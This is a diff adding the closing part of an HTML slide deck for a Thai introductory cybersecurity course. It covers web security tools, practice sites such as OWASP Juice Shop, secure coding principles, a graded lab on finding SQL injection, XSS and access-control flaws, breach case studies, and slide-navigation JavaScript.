+                <div class="card" style="text-align: center;">
+                    <i class="fas fa-bolt" style="font-size: 3rem; color: #3b82f6;"></i>
+                    <h3>OWASP ZAP</h3>
+                    <p>Zed Attack Proxy. เครื่องมือฟรีจาก OWASP สำหรับ Scan ช่องโหว่</p>
+                </div>
+                <div class="card" style="text-align: center;">
+                    <i class="fas fa-syringe" style="font-size: 3rem; color: #10b981;"></i>
+                    <h3>SQLMap</h3>
+                    <p>Automated Tool สำหรับเจาะหา SQL Injection โดยเฉพาะ</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-search"></i> Burp Suite Concept</h2>
+            <p>ทำงานเป็น <strong>Man-in-the-Middle (Proxy)</strong> ระหว่าง Browser และ Server</p>
+            <div style="display: flex; align-items: center; justify-content: center; gap: 1rem; margin-top: 2rem;">
+                <div style="text-align: center;">
+                    <i class="fas fa-laptop" style="font-size: 4rem;"></i><br>User
+                </div>
+                <div style="width: 100px; height: 5px; background: grey;"></div>
+                <div style="border: 3px solid var(--accent); padding: 20px; border-radius: 10px; text-align: center;">
+                    <i class="fas fa-ghost" style="font-size: 3rem; color: var(--accent);"></i><br>
+                    <strong>Burp Suite</strong><br>
+                    <span style="font-size: 0.8rem; color: var(--danger);">Intercept & Modify Here!</span>
+                </div>
+                <div style="width: 100px; height: 5px; background: grey;"></div>
+                <div style="text-align: center;">
+                    <i class="fas fa-server" style="font-size: 4rem;"></i><br>Server
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-gamepad"></i> แหล่งฝึกฝน (Learning Platforms)</h2>
+            <div class="grid-2">
+                <div class="card">
+                    <h3><i class="fas fa-shopping-cart"></i> OWASP Juice Shop</h3>
+                    <p>เว็บ E-commerce ที่ "ตั้งใจ" สร้างมาให้มีช่องโหว่ครบทุกรูปแบบ สำหรับฝึก Hack</p>
+                </div>
+                <div class="card">
+                    <h3><i class="fas fa-shield-alt"></i> DVWA</h3>
+                    <p>Damn Vulnerable Web App - เว็บแอปที่ปรับระดับความยากง่ายของการป้องกันได้</p>
+                </div>
+                <div class="card">
+                    <h3><i class="fas fa-graduation-cap"></i> PortSwigger Academy</h3>
+                    <p>แหล่งเรียนรู้ฟรีจากผู้สร้าง Burp Suite (เนื้อหาดีมาก)</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-code"></i> Secure Coding Practices</h2>
+            <p>หลักการเขียนโค้ดให้ปลอดภัยสำหรับ Developer</p>
+            <ul>
+                <li><strong>Input Validation:</strong> อย่าไว้ใจ Input จาก User (All input is evil)</li>
+                <li><strong>Output Encoding:</strong> แปลงข้อมูลก่อนแสดงผลเสมอ</li>
+                <li><strong>Authentication & Password Management:</strong> ใช้ Lib มาตรฐาน อย่าเขียนเอง</li>
+                <li><strong>Access Control:</strong> เช็คสิทธิ์ทุกจุด (Vertical & Horizontal)</li>
+                <li><strong>Error Handling:</strong> อย่าโชว์ Error stack trace ให้ User เห็น</li>
+                <li><strong>Data Protection:</strong> Encrypt ข้อมูลสำคัญทั้งขณะส่งและขณะเก็บ</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-flask"></i> Lab 3: Web Security Exercise</h2>
+            <div class="card" style="background: rgba(16, 185, 129, 0.1);">
+                <h3>ภารกิจ (Mission)</h3>
+                <ol>
+                    <li>ติดตั้งและตั้งค่า <strong>Burp Suite / OWASP ZAP</strong></li>
+                    <li>เข้าใช้งาน <strong>OWASP Juice Shop</strong> (Localhost / Online)</li>
+                    <li>ค้นหาและโจมตีช่องโหว่ 3 ประเภท:
+                        <ul>
+                            <li>SQL Injection (Login Bypass)</li>
+                            <li>XSS (โพสต์ข้อความที่มี Script)</li>
+                            <li>Broken Access Control (เข้าถึงหน้าที่ไม่มีสิทธิ์)</li>
+                        </ul>
+                    </li>
+                    <li>เขียนรายงานสรุปผลและการป้องกัน</li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-file-alt"></i> รายละเอียดรายงาน (Lab Report)</h2>
+            <p>สิ่งที่ต้องส่งใน Lab 3 Report (10 คะแนน)</p>
+            <table class="vs-table">
+                <tr>
+                    <th style="width: 30%;">หัวข้อ</th>
+                    <th>รายละเอียด</th>
+                </tr>
+                <tr>
+                    <td><strong>1. Vulnerability Description</strong></td>
+                    <td>อธิบายช่องโหว่ที่เจอคืออะไร ตามทฤษฎี</td>
+                </tr>
+                <tr>
+                    <td><strong>2. Reproduction Steps</strong></td>
+                    <td>ขั้นตอนการโจมตี (Capture หน้าจอหลักฐานประกอบ)</td>
+                </tr>
+                <tr>
+                    <td><strong>3. Impact</strong></td>
+                    <td>ความเสียหายที่อาจเกิดขึ้นหากถูกโจมตีจริง</td>
+                </tr>
+                <tr>
+                    <td><strong>4. Remediation</strong></td>
+                    <td><span style="color: var(--success);">สำคัญ!</span> วิธีแก้ไขโค้ดเพื่อป้องกัน (Concept)</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-newspaper"></i> Case Study: ข้อมูลหลุดครั้งใหญ่</h2>
+            <p>เรียนรู้จากความผิดพลาดในอดีต</p>
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Case A: Equifax (2017)</h3>
+                    <ul>
+                        <li><strong>สาเหตุ:</strong> ใช้ Apache Struts เวอร์ชันเก่าที่มีช่องโหว่ (A06: Outdated Components)</li>
+                        <li><strong>ผลกระทบ:</strong> ข้อมูลคนอเมริกัน 147 ล้านคนรั่วไหล</li>
+                        <li><strong>บทเรียน:</strong> Patch Management สำคัญมาก</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3>Case B: Typical SQLi Breach</h3>
+                    <ul>
+                        <li><strong>สาเหตุ:</strong> หน้า Login ไม่ทำ Input Validation</li>
+                        <li><strong>ผลกระทบ:</strong> Hacker ดึงฐานข้อมูลลูกค้าทั้งหมด (Dump Database)</li>
+                        <li><strong>บทเรียน:</strong> SQL Injection ป้องกันได้ง่ายถ้าไม่ประมาท</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-clipboard-check"></i> สรุปคะแนน (Assessment Summary)</h2>
+            <div class="grid-3" style="text-align: center; margin-top: 2rem;">
+                <div class="card">
+                    <div class="number-badge" style="width: 60px; height: 60px; font-size: 1.5rem;">10</div>
+                    <h3>Lab 3 Report</h3>
+                    <p>Web Security Exercise</p>
+                </div>
+                <div class="card">
+                    <div class="number-badge" style="width: 60px; height: 60px; font-size: 1.5rem; background: var(--accent);">10</div>
+                    <h3>Quiz Week 7</h3>
+                    <p>OWASP Top 10 Concepts</p>
+                </div>
+                <div class="card">
+                    <div class="number-badge" style="width: 60px; height: 60px; font-size: 1.5rem; background: var(--success);">5</div>
+                    <h3>Participation</h3>
+                    <p>Group Activity & Discussion</p>
+                </div>
+            </div>
+            <h2 style="text-align: center; margin-top: 2rem; border: none;">รวม 25 คะแนน</h2>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-comments"></i> ชวนคิด (Discussion)</h2>
+            <div style="background: var(--glass); padding: 3rem; border-radius: 20px; text-align: center;">
+                <h3 style="font-style: italic; margin-bottom: 2rem;">
+                    "ในฐานะ Software Engineer คุณคิดว่าใครควรรับผิดชอบเรื่องความปลอดภัย?"
+                </h3>
+                <div class="grid-3">
+                    <div class="btn" style="justify-content: center;">Developer?</div>
+                    <div class="btn" style="justify-content: center;">Security Team?</div>
+                    <div class="btn" style="justify-content: center;">Tester/QA?</div>
+                </div>
+                <p style="margin-top: 2rem; color: var(--success);">คำตอบคือ: <strong>Everyone (DevSecOps)</strong></p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-book"></i> แหล่งเรียนรู้เพิ่มเติม (Resources)</h2>
+            <ul>
+                <li>🌐 <strong>OWASP Top 10:</strong> <a href="#" style="color: var(--primary);">owasp.org/Top10</a></li>
+                <li>📖 <strong>OWASP Cheat Sheets:</strong> <a href="#" style="color: var(--primary);">cheatsheetseries.owasp.org</a></li>
+                <li>🧪 <strong>OWASP Juice Shop:</strong> <a href="#" style="color: var(--primary);">owasp.org/www-project-juice-shop</a></li>
+                <li>🔧 <strong>DVWA:</strong> <a href="#" style="color: var(--primary);">github.com/digininja/DVWA</a></li>
+                <li>🎮 <strong>PortSwigger Web Security Academy:</strong> <a href="#" style="color: var(--primary);">portswigger.net/web-security</a></li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-compress-arrows-alt"></i> สรุปบทเรียน (Summary)</h2>
+            <ul>
+                <li><i class="fas fa-check"></i> Web Application เป็นเป้าหมายหลักของการโจมตีในปัจจุบัน</li>
+                <li><i class="fas fa-check"></i> OWASP Top 10 เป็นมาตรฐานที่ Dev ต้องรู้</li>
+                <li><i class="fas fa-check"></i> Injection และ Broken Access Control ยังคงเป็นปัญหาใหญ่</li>
+                <li><i class="fas fa-check"></i> <strong>"Security by Design"</strong> ดีกว่ามาแก้ทีหลัง</li>
+                <li><i class="fas fa-check"></i> เครื่องมืออย่าง Burp Suite ช่วยให้เราเห็นสิ่งที่ Browser ซ่อนไว้</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-calendar-alt"></i> สัปดาห์หน้า (Next Week)</h2>
+            <div style="text-align: center; margin-top: 3rem;">
+                <h1 style="color: var(--accent);">Review Session & Pre-Exam</h1>
+                <p style="font-size: 1.5rem;">เตรียมตัวสอบ Midterm</p>
+                <div style="margin-top: 2rem;">
+                    <p><i class="fas fa-exclamation-circle"></i> อย่าลืมส่ง Lab 3 ก่อนเข้าเรียนคาบหน้า</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%;">
+                <i class="fas fa-question-circle" style="font-size: 8rem; color: var(--primary); margin-bottom: 2rem; animation: float 3s ease-in-out infinite;"></i>
+                <h1>Q & A</h1>
+                <p>สอบถามข้อสงสัย / แลกเปลี่ยนความคิดเห็น</p>
+                <p style="margin-top: 2rem; font-size: 1.2rem; color: #64748b;">ENGSE214 – ความมั่นคงปลอดภัยทางไซเบอร์เบื้องต้น</p>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<div class="controls">
+    <div class="progress-bar" id="progressBar"></div>
+    <button class="btn" onclick="adjustFontSize(-2)"><i class="fas fa-minus"></i> A</button>
+    <button class="btn" onclick="adjustFontSize(2)"><i class="fas fa-plus"></i> A</button>
+    <div style="width: 1px; background: rgba(255,255,255,0.2); margin: 0 10px;"></div>
+    <button class="btn" onclick="prevSlide()"><i class="fas fa-chevron-left"></i> Prev</button>
+    <span id="slideCounter" style="color: white; align-self: center; font-family: 'Kanit'; min-width: 60px; text-align: center;">1 / 35</span>
+    <button class="btn" onclick="nextSlide()">Next <i class="fas fa-chevron-right"></i></button>
+    <div style="width: 1px; background: rgba(255,255,255,0.2); margin: 0 10px;"></div>
+    <button class="btn" onclick="toggleFullScreen()"><i class="fas fa-expand"></i> Full</button>
+</div>
+
+<script>
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    const totalSlides = slides.length;
+    const slideCounter = document.getElementById('slideCounter');
+    const progressBar = document.getElementById('progressBar');
+    const container = document.getElementById('slideContainer');
+    let baseFontSize = 16;
+
+    function showSlide(index) {
+        if (index < 0) index = 0;
+        if (index >= totalSlides) index = totalSlides - 1;
+        
+        slides[currentSlide].classList.remove('active');
+        currentSlide = index;
+        slides[currentSlide].classList.add('active');
+        
+        // Update Counter
+        slideCounter.textContent = `${currentSlide + 1} / ${totalSlides}`;
+        
+        // Update Progress Bar
+        const progress = ((currentSlide + 1) / totalSlides) * 100;
+        progressBar.style.width = `${progress}%`;
+    }
+
+    function nextSlide() {
+        showSlide(currentSlide + 1);
+    }
+
+    function prevSlide() {
+        showSlide(currentSlide - 1);
+    }
+
+    function adjustFontSize(change) {
+        baseFontSize += change;
+        if(baseFontSize < 12) baseFontSize = 12;
+        if(baseFontSize > 24) baseFontSize = 24;
+        document.body.style.fontSize = baseFontSize + 'px';
+    }
+
+    function toggleFullScreen() {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen();
+        } else {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+        }
+    }
+
+    // Keyboard Navigation
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'ArrowRight' || e.key === ' ') {
+            nextSlide();
+        } else if (e.key === 'ArrowLeft') {
+            prevSlide();
+        } else if (e.key === 'f') {
+            toggleFullScreen();
+        }
+    });
+
+    // Initialize
+    showSlide(0);
+
+    // Add animation for Q&A icon
+    const styleSheet = document.createElement("style");
+    styleSheet.innerText = `
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0px); }
+        }
+    `;
+    document.head.appendChild(styleSheet);
+</script>
+
+</body>
+</html>
